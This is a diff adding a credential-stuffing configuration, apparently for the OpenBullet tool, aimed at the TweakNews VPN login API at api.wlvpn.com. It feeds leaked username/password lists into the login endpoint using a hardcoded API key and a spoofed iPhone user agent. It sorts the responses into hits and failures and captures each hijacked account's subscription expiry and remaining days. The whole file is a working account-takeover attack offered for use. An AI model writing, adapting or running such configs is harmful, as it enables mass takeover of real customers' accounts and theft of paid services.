@@ -1,0 +1,77 @@
+[SETTINGS]
+{
+  "Name": "TweakNews VPN",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-15T10:08:46.224998-07:00",
+  "AdditionalInfo": "ProxyLess | Capture",
+  "Author": "@H0S31N",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#POST REQUEST POST "https://api.wlvpn.com/customer/login/" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"api-key\":\"a26d9542e2d1bd1887e8d161652140c0\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: api.wlvpn.com" 
+  HEADER "Connection: close" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Tweaknews/1.0.0 (iPhone; iOS 13.3.1; Scale/2.00)" 
+  HEADER "Accept-Language: en;q=1, fa-US;q=0.9" 
+  HEADER "Content-Length: 124" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"result\":0,\"status\":\"10100\"}" 
+  KEYCHAIN Success OR 
+    KEY "\"result\":1," 
+
+#Koni PARSE "<SOURCE>" JSON "sub_end_epoch" -> VAR "Koni" 
+
+#TM PARSE "<SOURCE>" JSON "time_remaining" -> VAR "TM" 
+
+#Sub FUNCTION UnixTimeToDate "<Koni>" -> CAP "Sub" 
+
+#time_remaining FUNCTION Compute "<TM>/86400" -> CAP "time_remaining" 
+
